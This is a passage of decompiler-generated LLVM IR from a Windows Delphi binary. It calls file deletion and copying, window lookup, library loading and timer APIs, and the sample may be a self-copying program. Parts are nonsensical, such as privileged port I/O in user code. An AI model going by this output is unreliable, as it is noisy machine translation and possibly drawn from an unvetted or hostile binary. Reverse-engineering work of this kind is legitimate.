  %45 = add i32 %3, 117, !insn.addr !1249
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1249
  %47 = load i8, i8* %46, align 1, !insn.addr !1249
  %48 = add i8 %47, %34, !insn.addr !1249
  %49 = icmp eq i8 %48, 0, !insn.addr !1249
  store i8 %48, i8* %46, align 1, !insn.addr !1249
  br i1 %49, label %dec_label_pc_4060c8, label %dec_label_pc_406054, !insn.addr !1250

dec_label_pc_406054:                              ; preds = %dec_label_pc_40603d
  %50 = xor i32 %3, %1, !insn.addr !1251
  %51 = trunc i32 %3 to i16, !insn.addr !1252
  %52 = inttoptr i32 %50 to i32*, !insn.addr !1252
  %53 = load i32, i32* %52, align 4, !insn.addr !1252
  call void @__asm_outsd(i16 %51, i32 %53), !insn.addr !1252
  %54 = inttoptr i32 %50 to i8*, !insn.addr !1253
  %55 = load i8, i8* %54, align 1, !insn.addr !1253
  call void @__asm_outsb(i16 %51, i8 %55), !insn.addr !1253
  %56 = load i8, i8* %32, align 1, !insn.addr !1254
  %57 = add i8 %56, %34, !insn.addr !1254
  store i8 %57, i8* %32, align 1, !insn.addr !1254
  %58 = call i32 @__asm_iretd(), !insn.addr !1255
  %59 = add i32 %2, -117, !insn.addr !1256
  %60 = inttoptr i32 %59 to i8*, !insn.addr !1256
  %61 = load i8, i8* %60, align 1, !insn.addr !1256
  %62 = add i8 %61, -69, !insn.addr !1256
  store i8 %62, i8* %60, align 1, !insn.addr !1256
  %63 = call i8 @__asm_in(i16 -11077), !insn.addr !1257
  %64 = call i32 @__readfsdword(i32 0), !insn.addr !1258
  store i32 %64, i32* %stack_var_-12, align 4, !insn.addr !1258
  %65 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1258
  call void @__writefsdword(i32 0, i32 %65), !insn.addr !1259
  %66 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1260
  %67 = add i32 %66, 1, !insn.addr !1260
  store i32 %67, i32* @global_var_4096c0, align 4, !insn.addr !1260
  %68 = load i32, i32* %stack_var_-12, align 4, !insn.addr !1261
  call void @__writefsdword(i32 0, i32 %68), !insn.addr !1262
  ret i32 0, !insn.addr !1263

dec_label_pc_4060c8:                              ; preds = %dec_label_pc_40603d
  %69 = call i32 @function_403c90(), !insn.addr !1264
  store i32 %69, i32* %ebx, align 4, !insn.addr !1265
  %70 = icmp slt i32 %69, 0, !insn.addr !1266
  br i1 %70, label %dec_label_pc_4060f0, label %dec_label_pc_4060d8, !insn.addr !1267

dec_label_pc_4060d8:                              ; preds = %dec_label_pc_4060c8
  %71 = add i32 %69, 1, !insn.addr !1268
  store i32 %71, i32* %ebx, align 4, !insn.addr !1268
  %72 = call i32 @"@LStrCmp"(), !insn.addr !1269
  br label %dec_label_pc_406131

dec_label_pc_4060f0:                              ; preds = %dec_label_pc_4060c8
  %73 = call i32 @function_403c88(), !insn.addr !1270
  %74 = call i32 @"@DynArraySetLength"(), !insn.addr !1271
  %75 = call i32 @function_403c90(), !insn.addr !1272
  %76 = call i32 @"@LStrAsg"(), !insn.addr !1273
  store i32 -1, i32* %ebp.0.reg2mem, !insn.addr !1274
  br label %dec_label_pc_406131, !insn.addr !1274

dec_label_pc_406131:                              ; preds = %dec_label_pc_4060d8, %dec_label_pc_4060f0
  %ebp.0.reload = load i32, i32* %ebp.0.reg2mem
  ret i32 %ebp.0.reload, !insn.addr !1275
}

define i32 @function_406138() local_unnamed_addr {
dec_label_pc_406138:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1276
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1276
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1276
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1277
  %2 = load i32, i32* @global_var_4096c4, align 4, !insn.addr !1278
  %3 = add i32 %2, 1, !insn.addr !1278
  %4 = icmp eq i32 %3, 0, !insn.addr !1278
  store i32 %3, i32* @global_var_4096c4, align 4, !insn.addr !1278
  %5 = icmp eq i1 %4, false, !insn.addr !1279
  br i1 %5, label %dec_label_pc_406161, label %dec_label_pc_406151, !insn.addr !1279

dec_label_pc_406151:                              ; preds = %dec_label_pc_406138
  %6 = call i32 @"@DynArrayClear"(), !insn.addr !1280
  br label %dec_label_pc_406161, !insn.addr !1280

dec_label_pc_406161:                              ; preds = %dec_label_pc_406151, %dec_label_pc_406138
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1281
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1282
  ret i32 0, !insn.addr !1283
}

define i32 @function_40616f() local_unnamed_addr {
dec_label_pc_40616f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1284
  ret i32 %0, !insn.addr !1284
}

define i32 @function_406174() local_unnamed_addr {
dec_label_pc_406174:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1285
}

define i32 @function_406176(i32 %arg1) local_unnamed_addr {
dec_label_pc_406176:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1286
}

define i32 @function_406178() local_unnamed_addr {
dec_label_pc_406178:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1287
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1287
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1287
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1288
  %2 = load i32, i32* @global_var_4096c4, align 4, !insn.addr !1289
  %3 = add i32 %2, -1, !insn.addr !1289
  %4 = icmp eq i32 %2, 0, !insn.addr !1289
  store i32 %3, i32* @global_var_4096c4, align 4, !insn.addr !1289
  %5 = icmp eq i1 %4, false, !insn.addr !1290
  br i1 %5, label %dec_label_pc_4061ac, label %dec_label_pc_406192, !insn.addr !1290

dec_label_pc_406192:                              ; preds = %dec_label_pc_406178
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1291
  br label %dec_label_pc_4061ac, !insn.addr !1292

dec_label_pc_4061ac:                              ; preds = %dec_label_pc_406192, %dec_label_pc_406178
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1293
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1294
  ret i32 0, !insn.addr !1295
}

define i32 @function_4061ba() local_unnamed_addr {
dec_label_pc_4061ba:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1296
  ret i32 %0, !insn.addr !1296
}

define i32 @function_4061bf() local_unnamed_addr {
dec_label_pc_4061bf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1297
}

define i32 @function_4061c1(i32 %arg1) local_unnamed_addr {
dec_label_pc_4061c1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1298
}

define i32 @function_4061c4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4061c4:
  %esp.0.reg2mem = alloca i32, !insn.addr !1299
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i1 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  %4 = and i32 %2, -65536, !insn.addr !1300
  br i1 %3, label %dec_label_pc_40623c, label %dec_label_pc_4061d3, !insn.addr !1301

dec_label_pc_4061d3:                              ; preds = %dec_label_pc_4061c4
  %5 = udiv i32 %2, 256, !insn.addr !1300
  %6 = mul nuw nsw i32 %5, 46, !insn.addr !1300
  %7 = add i32 %6, %2, !insn.addr !1300
  %8 = and i32 %7, 255, !insn.addr !1300
  %9 = or i32 %8, %4, !insn.addr !1300
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1302
  %11 = load i8, i8* %10, align 1, !insn.addr !1302
  %12 = trunc i32 %7 to i8, !insn.addr !1302
  %factor = mul i8 %12, 26
  %13 = add i8 %11, %factor, !insn.addr !1303
  store i8 %13, i8* %10, align 1, !insn.addr !1303
  store i32 -704856605, i32* %stack_var_-4, align 4, !insn.addr !1304
  store i8* null, i8** %stack_var_-20, align 4, !insn.addr !1305
  %14 = call i32 @__readfsdword(i32 0), !insn.addr !1306
  store i32 %14, i32* %stack_var_-48, align 4, !insn.addr !1306
  %15 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1306
  call void @__writefsdword(i32 0, i32 %15), !insn.addr !1307
  %16 = call i32 @GetClassLongA(i32* inttoptr (i32 -1 to i32*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1308
  ret i32 %16, !insn.addr !1309

dec_label_pc_40623c:                              ; preds = %dec_label_pc_4061c4
  %17 = trunc i32 %0 to i8
  %18 = and i32 %0, 255, !insn.addr !1310
  %19 = or i32 %4, %18, !insn.addr !1310
  %20 = inttoptr i32 %19 to i8*, !insn.addr !1311
  %21 = load i8, i8* %20, align 1, !insn.addr !1311
  %22 = add i8 %21, %17, !insn.addr !1311
  store i8 %22, i8* %20, align 1, !insn.addr !1311
  %23 = load i8, i8* inttoptr (i32 -1668762056 to i8*), align 8, !insn.addr !1312
  %24 = trunc i32 %1 to i8, !insn.addr !1312
  %25 = add i8 %23, %24, !insn.addr !1312
  store i8 %25, i8* inttoptr (i32 -1668762056 to i8*), align 8, !insn.addr !1312
  %26 = call i32 @function_406fd0(), !insn.addr !1313
  %27 = call i32 @"@LStrPos"(), !insn.addr !1314
  %28 = call i32 @"@LStrPos"(), !insn.addr !1315
  %29 = add i32 %28, -1, !insn.addr !1316
  %30 = icmp slt i32 %29, 0, !insn.addr !1317
  %31 = add i32 %27, 2, !insn.addr !1318
  %32 = icmp sgt i32 %31, %29, !insn.addr !1319
  %or.cond = or i1 %30, %32
  br i1 %or.cond, label %dec_label_pc_4062ec, label %dec_label_pc_406274, !insn.addr !1320

dec_label_pc_406274:                              ; preds = %dec_label_pc_40623c
  store i32 -704856617, i32* %stack_var_-4, align 4, !insn.addr !1321
  %33 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1321
  %34 = call i32 @"@LStrCopy"(), !insn.addr !1322
  %35 = load i32, i32* inttoptr (i32 -704856617 to i32*), align 4, !insn.addr !1323
  %36 = icmp eq i32 %35, 0, !insn.addr !1323
  store i32 %33, i32* %esp.0.reg2mem, !insn.addr !1324
  br i1 %36, label %dec_label_pc_4062ec, label %dec_label_pc_40629c, !insn.addr !1324

dec_label_pc_40629c:                              ; preds = %dec_label_pc_406274
  %37 = call i32 @function_406db8(), !insn.addr !1325
  %38 = call i32 @"@LStrFromPChar"(), !insn.addr !1326
  %39 = call i32 @"@LStrCat"(), !insn.addr !1327
  %40 = call i32 @function_4036c8(), !insn.addr !1328
  %41 = inttoptr i32 %40 to i8*, !insn.addr !1329
  %42 = call i1 @DeleteFileA(i8* %41), !insn.addr !1330
  %43 = call i32 @function_4036c8(), !insn.addr !1331
  %44 = inttoptr i32 %43 to i8*, !insn.addr !1332
  store i8* %44, i8** %stack_var_-20, align 4, !insn.addr !1332
  %45 = ptrtoint i8** %stack_var_-20 to i32, !insn.addr !1332
  %46 = call i1 @CopyFileA(i8* %44, i8* bitcast (i32* @0 to i8*), i1 ptrtoint (i32* @0 to i1)), !insn.addr !1333
  %47 = call i32 @function_405f28(), !insn.addr !1334
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1334
  br label %dec_label_pc_4062ec, !insn.addr !1334

dec_label_pc_4062ec:                              ; preds = %dec_label_pc_40629c, %dec_label_pc_406274, %dec_label_pc_40623c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %48 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1335
  %49 = load i32, i32* %48, align 4, !insn.addr !1335
  call void @__writefsdword(i32 0, i32 %49), !insn.addr !1336
  %50 = add i32 %esp.0.reload, 8, !insn.addr !1337
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1337
  store i32 4219662, i32* %51, align 4, !insn.addr !1337
  %52 = call i32 @"@LStrArrayClr"(), !insn.addr !1338
  ret i32 %52, !insn.addr !1339
}

define i32 @function_406307() local_unnamed_addr {
dec_label_pc_406307:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1340
  ret i32 %0, !insn.addr !1340
}

define i32 @function_40630c() local_unnamed_addr {
dec_label_pc_40630c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1341
}

define i32 @function_40630e(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40630e:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1342
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1342
  %3 = load i32, i32* %2, align 4, !insn.addr !1342
  ret i32 %3, !insn.addr !1343
}

define i32 @function_40631f() local_unnamed_addr {
dec_label_pc_40631f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1344
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1344
  store i32 %1, i32* %2, align 4, !insn.addr !1344
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1345
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1345
  %7 = add i8 %4, %6, !insn.addr !1345
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1345
  store i8 %7, i8* %8, align 1, !insn.addr !1345
  %9 = load i32, i32* %eax, align 4, !insn.addr !1346
  ret i32 %9, !insn.addr !1346
}

define i32 @function_40632e() local_unnamed_addr {
dec_label_pc_40632e:
  %0 = call i32 @__decompiler_undefined_function_0()
  %edx = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !1347
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1347
  store i8 %4, i8* %5, align 1, !insn.addr !1347
  %6 = mul i32 %0, 4096, !insn.addr !1348
  %7 = udiv i32 %0, 1048576, !insn.addr !1348
  %8 = or i32 %7, %6, !insn.addr !1348
  %9 = and i32 %0, 1048576, !insn.addr !1348
  %10 = icmp eq i32 %9, 0, !insn.addr !1348
  %11 = load i32, i32* %edx, align 4, !insn.addr !1349
  %12 = trunc i32 %11 to i16, !insn.addr !1349
  %13 = call i8 @__asm_in(i16 %12), !insn.addr !1349
  %14 = sext i8 %13 to i32, !insn.addr !1349
  %15 = or i32 %2, %14, !insn.addr !1349
  %16 = select i1 %10, i32 0, i32 255, !insn.addr !1350
  %17 = and i32 %15, -256, !insn.addr !1350
  %18 = or i32 %17, %16, !insn.addr !1350
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1351
  %20 = load i8, i8* %19, align 1, !insn.addr !1351
  %21 = mul i8 %20, 2, !insn.addr !1351
  %22 = lshr i8 %20, 7, !insn.addr !1351
  %23 = or i8 %22, %21, !insn.addr !1351
  store i8 %23, i8* %19, align 1, !insn.addr !1351
  %24 = bitcast i32* %edx to i8*
  %25 = load i8, i8* %24, align 4, !insn.addr !1352
  %26 = udiv i32 %1, 256, !insn.addr !1352
  %27 = trunc i32 %26 to i8, !insn.addr !1352
  %28 = add i8 %25, %27, !insn.addr !1352
  %29 = load i32, i32* %edx, align 4, !insn.addr !1352
  %30 = inttoptr i32 %29 to i8*, !insn.addr !1352
  store i8 %28, i8* %30, align 1, !insn.addr !1352
  %31 = add i32 %8, -4, !insn.addr !1353
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1353
  store i32 4219400, i32* %32, align 4, !insn.addr !1353
  %33 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1354
  %34 = sext i1 %33 to i32, !insn.addr !1354
  ret i32 %34, !insn.addr !1355
}

define i32 @function_406338(i32 %arg1) local_unnamed_addr {
dec_label_pc_406338:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_406348() local_unnamed_addr {
dec_label_pc_406348:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1356
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1356
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1356
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1357
  %2 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1358
  %3 = add i32 %2, 1, !insn.addr !1358
  store i32 %3, i32* @global_var_4096cc, align 4, !insn.addr !1358
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1359
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1360
  ret i32 0, !insn.addr !1361
}

define i32 @function_40636d() local_unnamed_addr {
dec_label_pc_40636d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1362
  ret i32 %0, !insn.addr !1362
}

define i32 @function_406372() local_unnamed_addr {
dec_label_pc_406372:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1363
}

define i32 @function_406374(i32 %arg1) local_unnamed_addr {
dec_label_pc_406374:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1364
}

define i32 @function_406378() local_unnamed_addr {
dec_label_pc_406378:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1365
  %2 = add i32 %1, -1, !insn.addr !1365
  store i32 %2, i32* @global_var_4096cc, align 4, !insn.addr !1365
  ret i32 %0, !insn.addr !1366
}

define i32 @function_406380() local_unnamed_addr {
dec_label_pc_406380:
  %eax.0.reg2mem = alloca i32, !insn.addr !1367
  %0 = call i32 @function_4063f4(), !insn.addr !1368
  %1 = load i32, i32* @global_var_408130, align 4
  %2 = icmp eq i32 %1, 0, !insn.addr !1369
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1370
  br i1 %2, label %dec_label_pc_4063b4, label %dec_label_pc_406392, !insn.addr !1370

dec_label_pc_406392:                              ; preds = %dec_label_pc_406380
  %3 = load i32*, i32** @global_var_408158, align 4
  %4 = ptrtoint i32* %3 to i32, !insn.addr !1371
  %5 = icmp eq i32* %3, null, !insn.addr !1372
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !1373
  br i1 %5, label %dec_label_pc_4063b4, label %dec_label_pc_40639c, !insn.addr !1373

dec_label_pc_40639c:                              ; preds = %dec_label_pc_406392
  %6 = call i32 @function_4066c0(), !insn.addr !1374
  call void @PostQuitMessage(i32 66), !insn.addr !1375
  %7 = call i32 @function_4043d4(i32 66), !insn.addr !1376
  unreachable, !insn.addr !1376

dec_label_pc_4063b4:                              ; preds = %dec_label_pc_406392, %dec_label_pc_406380
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1377
}

define i32 @function_4063c4() local_unnamed_addr {
dec_label_pc_4063c4:
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1378
  %1 = icmp eq i32 %0, 0, !insn.addr !1378
  br i1 %1, label %dec_label_pc_4063d2, label %dec_label_pc_4063cd, !insn.addr !1379

dec_label_pc_4063cd:                              ; preds = %dec_label_pc_4063c4
  %2 = call i32 @function_4063f4(), !insn.addr !1380
  br label %dec_label_pc_4063d2, !insn.addr !1380

dec_label_pc_4063d2:                              ; preds = %dec_label_pc_4063cd, %dec_label_pc_4063c4
  %3 = load i32, i32* inttoptr (i32 4227404 to i32*), align 4, !insn.addr !1381
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1382
  %5 = load i32, i32* %4, align 4, !insn.addr !1382
  %6 = mul i32 %5, 1000, !insn.addr !1382
  %7 = call i32 @SetTimer(i32* inttoptr (i32 4219776 to i32*), i32 %6, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1383
  store i32 %7, i32* @global_var_408104, align 4, !insn.addr !1384
  ret i32 %7, !insn.addr !1385
}

define i32 @function_4063f4() local_unnamed_addr {
dec_label_pc_4063f4:
  %.reg2mem = alloca i32, !insn.addr !1386
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1386
  %1 = icmp eq i32 %0, 0, !insn.addr !1386
  store i32 %0, i32* %.reg2mem, !insn.addr !1387
  br i1 %1, label %2, label %dec_label_pc_4063fd, !insn.addr !1387

; <label>:2:                                      ; preds = %dec_label_pc_4063f4
  %3 = call i32 @function_406411(), !insn.addr !1387
  %.pre = load i32, i32* @global_var_408104, align 4
  store i32 %.pre, i32* %.reg2mem, !insn.addr !1387
  br label %dec_label_pc_4063fd, !insn.addr !1387

dec_label_pc_4063fd:                              ; preds = %2, %dec_label_pc_4063f4
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1388
  ret i32 %.reload, !insn.addr !1389
}

define i32 @function_406411() local_unnamed_addr {
dec_label_pc_406411:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1390
}

define i32 @function_406414() local_unnamed_addr {
dec_label_pc_406414:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @function_406338(i32 %0), !insn.addr !1391
  ret i32 %1, !insn.addr !1392
}

define i32 @function_406420() local_unnamed_addr {
dec_label_pc_406420:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1393
  %1 = icmp eq i32 %0, 0, !insn.addr !1393
  br i1 %1, label %dec_label_pc_40642e, label %dec_label_pc_406429, !insn.addr !1394

dec_label_pc_406429:                              ; preds = %dec_label_pc_406420
  %2 = call i32 @function_406448(), !insn.addr !1395
  br label %dec_label_pc_40642e, !insn.addr !1395

dec_label_pc_40642e:                              ; preds = %dec_label_pc_406429, %dec_label_pc_406420
  %3 = call i32 @SetTimer(i32* inttoptr (i32 4219924 to i32*), i32 5266, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1396
  store i32 %3, i32* @global_var_408108, align 4, !insn.addr !1397
  ret i32 %3, !insn.addr !1398
}

define i32 @function_406448() local_unnamed_addr {
dec_label_pc_406448:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1399
  ret i32 %0, !insn.addr !1400
}

define i32 @function_406468() local_unnamed_addr {
dec_label_pc_406468:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1401
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1401
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1401
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1402
  %2 = load i32, i32* @global_var_4096d0, align 4, !insn.addr !1403
  %3 = add i32 %2, 1, !insn.addr !1403
  store i32 %3, i32* @global_var_4096d0, align 4, !insn.addr !1403
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1404
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1405
  ret i32 0, !insn.addr !1406
}

define i32 @function_40648d() local_unnamed_addr {
dec_label_pc_40648d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1407
  ret i32 %0, !insn.addr !1407
}

define i32 @function_406492() local_unnamed_addr {
dec_label_pc_406492:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1408
}

define i32 @function_406494(i32 %arg1) local_unnamed_addr {
dec_label_pc_406494:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1409
}

define i32 @function_406498() local_unnamed_addr {
dec_label_pc_406498:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096d0, align 4, !insn.addr !1410
  %2 = add i32 %1, -1, !insn.addr !1410
  store i32 %2, i32* @global_var_4096d0, align 4, !insn.addr !1410
  ret i32 %0, !insn.addr !1411
}

define i32 @function_4064a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4064a0:
  %esp.1.lcssa.reg2mem = alloca i32, !insn.addr !1412
  %esp.17.reg2mem = alloca i32, !insn.addr !1412
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1412
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-316 = alloca i32, align 4
  %1 = inttoptr i32 %0 to i8*, !insn.addr !1412
  %2 = call i32* @FindWindowA(i8* %1, i8* bitcast (i32* @0 to i8*)), !insn.addr !1413
  %3 = icmp eq i32* %2, null, !insn.addr !1414
  %4 = icmp eq i1 %3, false, !insn.addr !1415
  br i1 %4, label %dec_label_pc_40659e, label %dec_label_pc_4064c1, !insn.addr !1415

dec_label_pc_4064c1:                              ; preds = %dec_label_pc_4064a0
  %5 = call i32 @function_405ad4(), !insn.addr !1416
  %6 = call i32 @function_4036c8(), !insn.addr !1417
  %7 = inttoptr i32 %6 to i8*, !insn.addr !1418
  %8 = call i32* @LoadLibraryA(i8* %7), !insn.addr !1419
  %9 = call i32* @FindWindowA(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_4065c0, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_4065b8, i32 0, i32 0)), !insn.addr !1420
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1420
  store i32 %10, i32* %stack_var_-316, align 4, !insn.addr !1421
  %11 = call i1 @IsWindow(i32* %9), !insn.addr !1422
  %12 = icmp eq i1 %11, false, !insn.addr !1423
  store i32* %stack_var_-316, i32** %esp.0.in.reg2mem, !insn.addr !1424
  br i1 %12, label %dec_label_pc_4064ff, label %dec_label_pc_4064f3, !insn.addr !1424

dec_label_pc_4064f3:                              ; preds = %dec_label_pc_4064c1
  store i32 %10, i32* %stack_var_-332, align 4, !insn.addr !1425
  %13 = call i1 @PostMessageA(i32* null, i32 0, i32 18, i32 %10), !insn.addr !1426
  store i32* %stack_var_-332, i32** %esp.0.in.reg2mem, !insn.addr !1426
  br label %dec_label_pc_4064ff, !insn.addr !1426

dec_label_pc_4064ff:                              ; preds = %dec_label_pc_4064f3, %dec_label_pc_4064c1
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %14 = call i32 @Randomize(), !insn.addr !1427
  %15 = call i32 @function_405ea0(), !insn.addr !1428
  %16 = call i32 @"@_CToPasStr"(), !insn.addr !1429
  %17 = call i32 @"@AStrCmp"(), !insn.addr !1430
  %18 = call i32 @function_405648(), !insn.addr !1431
  %19 = add i32 %esp.0, -4, !insn.addr !1432
  %20 = inttoptr i32 %19 to i32*, !insn.addr !1432
  store i32 0, i32* %20, align 4, !insn.addr !1432
  %21 = add i32 %esp.0, -8, !insn.addr !1433
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1433
  store i32 0, i32* %22, align 4, !insn.addr !1433
  %23 = add i32 %esp.0, -12, !insn.addr !1434
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1434
  store i32 0, i32* %24, align 4, !insn.addr !1434
  %25 = add i32 %esp.0, -16, !insn.addr !1435
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1435
  %27 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1435
  store i32 %27, i32* %26, align 4, !insn.addr !1435
  %28 = call i1 @GetMessageA(%tagMSG* bitcast (i32* @0 to %tagMSG*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1436
  %29 = icmp eq i1 %28, false, !insn.addr !1437
  %30 = icmp eq i1 %29, false, !insn.addr !1438
  store i32 %esp.0, i32* %esp.17.reg2mem, !insn.addr !1438
  store i32 %esp.0, i32* %esp.1.lcssa.reg2mem, !insn.addr !1438
  br i1 %30, label %dec_label_pc_40653f, label %dec_label_pc_40655b, !insn.addr !1438

dec_label_pc_40653f:                              ; preds = %dec_label_pc_4064ff, %dec_label_pc_40653f
  %esp.17.reload = load i32, i32* %esp.17.reg2mem
  %31 = add i32 %esp.17.reload, -20, !insn.addr !1439
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1439
  store i32 %27, i32* %32, align 4, !insn.addr !1439
  %33 = call i32 @DispatchMessageA(%tagMSG* bitcast (i32* @0 to %tagMSG*)), !insn.addr !1440
  %34 = add i32 %esp.17.reload, -24, !insn.addr !1432
  %35 = inttoptr i32 %34 to i32*, !insn.addr !1432
  store i32 0, i32* %35, align 4, !insn.addr !1432
  %36 = add i32 %esp.17.reload, -28, !insn.addr !1433
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1433
  store i32 0, i32* %37, align 4, !insn.addr !1433
  %38 = add i32 %esp.17.reload, -32, !insn.addr !1434
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1434
  store i32 0, i32* %39, align 4, !insn.addr !1434
  %40 = add i32 %esp.17.reload, -36, !insn.addr !1435
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1435
  store i32 %27, i32* %41, align 4, !insn.addr !1435
  %42 = call i1 @GetMessageA(%tagMSG* bitcast (i32* @0 to %tagMSG*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1436
  %43 = icmp eq i1 %42, false, !insn.addr !1437
  %44 = icmp eq i1 %43, false, !insn.addr !1438
  store i32 %31, i32* %esp.17.reg2mem, !insn.addr !1438
  store i32 %31, i32* %esp.1.lcssa.reg2mem, !insn.addr !1438
  br i1 %44, label %dec_label_pc_40653f, label %dec_label_pc_40655b, !insn.addr !1438

dec_label_pc_40655b:                              ; preds = %dec_label_pc_40653f, %dec_label_pc_4064ff
  %esp.1.lcssa.reload = load i32, i32* %esp.1.lcssa.reg2mem
  %45 = call i32 @"@_CToPasStr"(), !insn.addr !1441
